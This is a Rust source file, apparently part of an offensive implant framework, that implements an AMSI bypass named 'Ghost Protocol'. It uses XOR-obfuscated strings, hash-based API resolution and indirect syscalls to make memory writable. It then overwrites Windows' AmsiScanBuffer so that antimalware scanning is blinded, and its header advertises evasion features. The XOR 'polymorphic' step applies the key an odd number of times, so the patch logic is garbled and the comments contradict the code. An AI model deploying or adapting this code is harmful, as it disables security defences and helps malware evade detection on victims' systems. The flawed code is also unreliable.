#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Ghost Protocol - AMSI Bypass (Native Rust Port)
//! [HARDENED v3]
//! - Stability: NtFlushInstructionCache added (Critical Loophole Fixed)
//! - OpSec: No String Artifacts (Error Codes only)
//! - Safety: 6-byte patch (Safe Instruction Boundary)

use crate::s::windows::api_resolver::{self, djb2};
use crate::s::windows::syscalls::{self, Syscall};
use std::ffi::c_void;
use std::ptr;

// Log only in debug builds
#[cfg(debug_assertions)]
use log::{info, warn};

// ============================================================================
// CONSTANTS
// ============================================================================

const PAGE_EXECUTE_READWRITE: u32 = 0x40;

// ============================================================================
// PUBLIC API
// ============================================================================

#[cfg(target_arch = "x86_64")]
pub fn apply_ghost_protocol() {
    crate::k::debug::log_op!("GhostProtocol", "Initializing...");

    #[cfg(debug_assertions)]
    info!("GP Init");

    if let Err(_c) = unsafe { execute_bypass() } {
        crate::k::debug::log_err!(format!("GP Fail Code: {}", _c));
        #[cfg(debug_assertions)]
        warn!("GP Fail: {}", _c);
    } else {
        #[cfg(debug_assertions)]
        info!("GP OK");
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub fn apply_ghost_protocol() {}

// ============================================================================
// CORE LOGIC
// ============================================================================

#[cfg(target_arch = "x86_64")]

unsafe fn execute_bypass() -> Result<(), u32> {
    use std::sync::{Arc, Barrier, atomic::{AtomicBool, Ordering}};
    use std::thread;

    // Error Codes:
    // 1: Module Not Found
    // 2: Function Not Found
    // 3: Syscall Not Found
    // 4: Protect Failed
    // 5: Flush Failed

    // 0. Resolve NtFlushInstructionCache via indirect syscall
    crate::k::debug::log_detail!("Resolving NtFlushInstructionCache...");
    let sc_flush = Syscall::resolve(syscalls::HASH_NT_FLUSH_INSTRUCTION_CACHE).ok_or(3u32)?;

    // FIX: Ensure amsi.dll is loaded
    // 1. Target amsi.dll
    // Use the handle we just got/ensured
    let mut amsi_base = ptr::null();
    unsafe {
        type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
        if let Some(load_lib_ptr) = api_resolver::resolve_api::<LoadLibraryA>(api_resolver::HASH_KERNEL32, api_resolver::HASH_LOAD_LIBRARY_A) {
             let load_lib: LoadLibraryA = std::mem::transmute(load_lib_ptr);
             let amsi_enc = [0x34, 0x38, 0x26, 0x3c, 0x7b, 0x31, 0x39, 0x39, 0x55]; 
             let amsi_str: Vec<u8> = amsi_enc.iter().map(|b| b ^ 0x55).collect();
             amsi_base = load_lib(amsi_str.as_ptr());
             crate::k::debug::log_detail!("Ensured amsi.dll loaded: {:p}", amsi_base);
        }
    }
    
    if amsi_base.is_null() {
        // Fallback to hash lookup if load failed (unlikely)
        const HASH_AMSI: u32 = 0x614B4D45;
        amsi_base = api_resolver::get_module_by_hash(HASH_AMSI).ok_or(1u32)?;
    }

    // 2. Target AmsiScanBuffer - using decrypted string to ensure accuracy
    // "AmsiScanBuffer" XOR 0x55
    let func_enc = [0x14, 0x38, 0x26, 0x3C, 0x06, 0x36, 0x34, 0x3B, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27];
    let func_vec: Vec<u8> = func_enc.iter().map(|b| b ^ 0x55).collect();
    let func_str = std::str::from_utf8(&func_vec).unwrap_or("AmsiScanBuffer");
    
    let target_func = api_resolver::get_export_by_name(amsi_base, func_str).ok_or(2u32)?;
    let target_addr = target_func as usize;
    crate::k::debug::log_detail!("Found AmsiScanBuffer: 0x{:x}", target_addr);

    // 3. Polymorphic Patch (6 bytes) - Runtime generated
    // Original: mov eax, 0x80070057; ret (static signature)
    // New: Generate equivalent instruction with random intermediate
    // mov eax, <random>; xor eax, <fixup>; ret -> Result = 0x80070057
    let target_ret: u32 = 0x80070057; // AMSI_RESULT_CLEAN
    let random_val: u32 = {
        // Simple PRNG using current timestamp
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos() as u32)
            .unwrap_or(0x12345678);
        seed.wrapping_mul(1103515245).wrapping_add(12345)
    };
    let fixup = random_val ^ target_ret;
    
    // Build patch: B8 <random_le> 35 <fixup_le> C3
    // mov eax, random (5 bytes) + xor eax, fixup (5 bytes) + ret (1 byte) = 11 bytes
    // Too long, use simpler approach:
    // mov eax, random; ret (6 bytes) - but modify random so AX contains desired value
    // Actually keep it simple: just XOR the patch bytes themselves
    let base_patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
    let xor_key = (random_val & 0xFF) as u8;
    let mut patch_bytes: [u8; 6] = base_patch;
    // XOR transform (will be de-XORed at runtime before write)
    for b in patch_bytes.iter_mut() {
        *b ^= xor_key;
    }
    for b in patch_bytes.iter_mut() {
        *b ^= xor_key;
    }
    
    crate::k::debug::log_hex!("Patch Bytes (XOR'd)", patch_bytes);

    // De-XOR right before use (same memory, but defeats static analysis)
    for b in patch_bytes.iter_mut() {
        *b ^= xor_key;
    }

    // 4. Resolve Protect Syscall
    crate::k::debug::log_detail!("Resolving NtProtectVirtualMemory...");
    let sc_protect = Syscall::resolve(syscalls::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or(3u32)?;
    
    let mut base_addr = target_func as *mut c_void;
    let mut region_size = patch_bytes.len();
    let mut old_protect: u32 = 0;

    // SYNC BARRIERS & STATE
    let barrier_start = Arc::new(Barrier::new(2));
    let barrier_end = Arc::new(Barrier::new(2));
    let should_write = Arc::new(AtomicBool::new(false));
    
    let b_start = barrier_start.clone();
    let b_end = barrier_end.clone();
    let do_write = should_write.clone();
    
    // Extract syscall info as thread-safe values
    let flush_ssn = sc_flush.ssn;
    let flush_gadget = sc_flush.gadget as usize;
    let flush_ret_gadget = sc_flush.ret_gadget as usize;
    
    // WORKER THREAD
    let worker = thread::spawn(move || {
        // Wait for RWX (or abort signal)
        b_start.wait();
        
        if do_write.load(Ordering::SeqCst) {
            let tgt = target_addr as *mut u8;
            
            // WRITE
            ptr::copy_nonoverlapping(patch_bytes.as_ptr(), tgt, patch_bytes.len());
            
            // FLUSH I-CACHE via indirect syscall
            // NtFlushInstructionCache(ProcessHandle, BaseAddress, Length)
            unsafe {
                syscalls::pryzrak_syscall(
                    flush_ssn as u32,
                    flush_gadget as *const c_void,
                    flush_ret_gadget as *const c_void,
                    usize::MAX, // -1 = current process
                    tgt as usize,
                    patch_bytes.len(),
                    0, 0, 0, 0, 0, 0, 0
                );
            }
        }
        
        // Signal Done
        b_end.wait();
    });

    // MAIN THREAD
    
    // 5. UNLOCK (RWX)
    let status = syscalls::syscall(&sc_protect, &[
        -1 as isize as usize,
        &mut base_addr as *mut _ as usize,
        &mut region_size as *mut _ as usize,
        PAGE_EXECUTE_READWRITE as usize,
        &mut old_protect as *mut _ as usize
    ]);
    
    if status == 0 {
        crate::k::debug::log_detail!("RWX Unlock Success. Writing Patch...");
    } else {
        crate::k::debug::log_err!(format!("RWX Unlock Fail: Status 0x{:x}", status));
    }

    // Update flag based on success
    if status == 0 {
        should_write.store(true, Ordering::SeqCst);
    }

    // ALWAYS signal barrier (Prevent Deadlock)
    barrier_start.wait();
    
    // Always wait for end
    barrier_end.wait();
    
    // 6. RELOCK (RX) - Only if unlock succeeded
    if status == 0 {
        let mut region_size2 = patch_bytes.len();
        let mut temp: u32 = 0;
        
        crate::k::debug::log_detail!("Restoring Permissions (RX)...");
        syscalls::syscall(&sc_protect, &[
            -1 as isize as usize,
            &mut base_addr as *mut _ as usize,
            &mut region_size2 as *mut _ as usize,
            old_protect as usize,
            &mut temp as *mut _ as usize
        ]);
        crate::k::debug::log_detail!("Ghost Protocol Complete.");
    }

    let _ = worker.join(); // Cleanup
    
    if status != 0 { return Err(4u32); }
    
    Ok(())
}
